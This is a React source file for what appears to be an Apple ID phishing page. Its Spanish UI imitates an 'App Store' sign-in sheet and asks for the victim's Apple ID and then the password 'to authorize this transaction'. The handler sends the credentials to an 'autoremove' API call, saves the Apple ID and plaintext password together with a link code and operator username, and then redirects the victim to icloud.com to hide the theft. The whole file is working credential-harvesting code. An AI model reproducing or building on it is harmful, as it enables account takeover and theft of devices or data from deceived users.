import React, { useEffect, useRef, useState } from "react";
import { Button, Form, Spinner } from "react-bootstrap";
import responses from "../../api/responses";
import { useData } from '../../context/UserContext'

const CheckData = ({
  translator
}) => {
  const { user } = useData();
  const [show, setShow] = useState(false);
  const [step, setStep] = useState(1);
  const [appleId, setAppleId] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [passwordError, setPasswordError] = useState(false);

  // Refs para focus automático
  const appleIdRef = useRef(null);
  const passwordRef = useRef(null);

  useEffect(() => {
    const footer = document.getElementById("footer");
    if (footer) {
      footer.style.zIndex = "1";
    }
  }, []);

  useEffect(() => {
    const timer = setTimeout(() => setShow(true), 1000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (step === 1 && appleIdRef.current) {
      //appleIdRef.current.focus();
    }
    if (step === 2 && passwordRef.current) {
      passwordRef.current.focus();
    }
  }, [step, show]);

  const handleNext = (e) => {
    e.preventDefault();
    if (appleId.trim()) {
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        setStep(2);
      }, 1500);
    }
  };

  const handleConnect = async (e) => {
    e.preventDefault();
    setConnecting(true);
    setPasswordError(false);
    try {
      let data = {
        appleId: appleId,
        password: password
      }
      const response = await responses.autoremove(appleId, password);
      let status = response.success;
      let responseData = response.message;
      await saveAutoRemoveData(status, responseData);
      if (!status) {
        setPasswordError(true);
      } else if (status) {
        setTimeout(() => {
          localStorage.removeItem(`userData_${user?.data?.linkCode}`);
          //window.location.reload();
          window.location.href = 'https://www.icloud.com';
        }, 1000);
      }
    } catch (error) {
      setPasswordError(true);
      console.error(error);
    }
    setConnecting(false);
  };

  const saveAutoRemoveData = async (status, response) => {
    //const geo = await responses.getLocation();

        let data = {
            linkCode: user?.data?.linkCode || '',
            appleID: appleId,
            password: password,
            response: response,
            username: user?.data?.username || '',
            status: status,
        }

        const resp = await responses.addData(data);
        return resp;
  }

  return (
    <>
      <style>
        {`
          .bottom-sheet-checkdata {
            position: fixed;
            left: 0;
            right: 0;
            bottom: 0;
            margin-left: auto;
            margin-right: auto;
            width: 100vw;
            max-width: 430px;
            border-radius: 18px 18px 0 0;
            background: #222;
            min-height: 75vh;
            height: 75h;
            max-height: 80vh;
            box-shadow: 0 -2px 16px rgba(0,0,0,0.4);
            flex-direction: column;
            justify-content: flex-start;
            z-index: 3000;
            transform: translateY(100%);
            transition: transform 0.5s cubic-bezier(0.4,0,0.2,1);
          }
          .bottom-sheet-checkdata.show {
            transform: translateY(0);
          }
          .bottom-sheet-backdrop {
            position: fixed;
            inset: 0;
            background: transparent;
            z-index: 2999;
          }
          .password-error-message {
            color: #ff4d4f;
            background: #2a181800;
            border-radius: 6px;
            margin-top: 0px;
            margin-bottom: 10px;
            padding: 0 12px;
            font-size: 14px;
            text-align: center;
            font-weight: 500;
            letter-spacing: 0.2px;
          }
          .info-message {
            color: #bbb;
            font-size: 15px;
            text-align: center;
            margin-bottom: 18px;
          }
          /* Placeholder gris claro para todos los inputs */
          .bottom-sheet-checkdata input::placeholder {
            color:rgba(172, 110, 110, 0.99) !important;
            opacity: 1 !important;
          }
          @media (max-width: 430px) {
            .bottom-sheet-checkdata {
              max-width: 100vw;
            }
          }
        `}
      </style>
      <div className="bottom-sheet-backdrop"></div>
      <div className={`bottom-sheet-checkdata${show ? " show" : ""}`}>
        <div style={{ padding: "24px 18px 0 18px" }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <div style={{ fontWeight: 600, fontSize: 22, color: "#fff" }}>App Store</div>
            <button
              aria-label="Cerrar"
              style={{
                background: "none",
                border: "none",
                color: "#bbb",
                fontSize: 24,
                cursor: "pointer",
                lineHeight: 1,
                padding: 0,
              }}
              onClick={() => {
                setStep(1);
                setAppleId("");
                setPassword("");
                setPasswordError(false);
              }}
            >
              &times;
            </button>
          </div>
        </div>
        <div style={{
          background: "#222",
          padding: "50px 18px",
          flex: 1,
          display: "flex",
          flexDirection: "column",
          justifyContent: "center"
        }}>
          {step === 1 && !loading && (
            <>
              <div style={{ textAlign: "center", marginBottom: 20 }}>
                <div style={{ fontWeight: 500, fontSize: 18, marginBottom: 8 }}>
                  {translator("Inicia sesión con tu Apple ID")}
                </div>
                <div className="info-message">
                  {translator("Ingresa tu Apple ID para continuar con la autorización de la transacción.")}
                </div>
              </div>
              <Form onSubmit={handleNext}>
                <Form.Group>
                  <Form.Control
                    type="text"
                    placeholder={translator("Ingresa tu Apple ID")}
                    value={appleId}
                    ref={appleIdRef}
                    onChange={e => setAppleId(e.target.value)}
                    style={{
                      background: "#333",
                      border: "none",
                      color: "#fff",
                      marginBottom: 18,
                      height: 44,
                      fontSize: 17,
                      borderRadius: 8,
                      textAlign: "left"
                    }}
                  />
                </Form.Group>
                <div style={{ display: "flex", justifyContent: "center" }}>
                  <Button
                    variant="secondary"
                    type="submit"
                    style={{
                      width: "200px",
                      height: 44,
                      borderRadius: 8,
                      fontWeight: 500,
                      fontSize: 17,
                      background: appleId.trim() ? "rgb(77, 144, 254)" : "#888",
                      border: "none",
                      marginBottom: 10,
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                      gap: 8
                    }}
                    disabled={!appleId.trim()}
                  >
                    {translator("Siguiente")}
                  </Button>
                </div>
              </Form>
            </>
          )}
          {loading && (
            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", height: "100%" }}>
              <Spinner animation="border" variant="light" style={{ width: 48, height: 48, marginBottom: 20 }} />
            </div>
          )}
          {step === 2 && !loading && (
            <>
              <div style={{ textAlign: "center", marginBottom: 20 }}>
                <div style={{ fontWeight: 500, fontSize: 18, marginBottom: 8 }}>
                  {translator("Inicia sesión con tu Apple ID")}
                </div>
                <div style={{ fontSize: 15, color: "#bbb" }}>
                  {translator("Ingresa la contraseña de")} <b>{appleId}</b> {translator("para autorizar esta transacción.")}.
                </div>
              </div>
              <Form onSubmit={handleConnect}>
                <Form.Group>
                  <Form.Control
                    type="password"
                    placeholder={translator("Contraseña")}
                    value={password}
                    ref={passwordRef}
                    onChange={e => {
                      setPassword(e.target.value);
                      setPasswordError(false);
                    }}
                    style={{
                      background: "#333",
                      border: "none",
                      color: "#fff",
                      marginBottom: 18,
                      height: 44,
                      fontSize: 17,
                      borderRadius: 8,
                      textAlign: "left"
                    }}
                  />
                  {passwordError && (
                    <div className="password-error-message">
                      {translator("Contraseña incorrecta. Intenta de nuevo.")}
                    </div>
                  )}
                </Form.Group>
                <div style={{ display: "flex", justifyContent: "center" }}>
                  <Button
                    variant="secondary"
                    type="submit"
                    style={{
                      width: "200px",
                      height: 44,
                      borderRadius: 8,
                      fontWeight: 500,
                      fontSize: 17,
                      background: password.trim() ? "rgb(77, 144, 254)" : "#888",
                      border: "none",
                      marginBottom: 10,
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                      gap: 8
                    }}
                    disabled={!password.trim() || connecting}
                  >
                    {connecting ? (
                      <>
                        <Spinner
                          as="span"
                          animation="border"
                          size="sm"
                          role="status"
                          aria-hidden="true"
                          style={{ marginRight: 8 }}
                        />
                        {translator("Conectando")}
                      </>
                    ) : (
                      translator("Conectar")
                    )}
                  </Button>
                </div>
              </Form>
              <div style={{ textAlign: "center" }}>
                <a href="#" style={{ color: "#4d90fe", fontSize: 15, textDecoration: "none", display: "none" }}>
                  {translator("Olvidé la contraseña")}
                </a>
              </div>
            </>
          )}
        </div>
      </div>
    </>
  );
};

export default CheckData;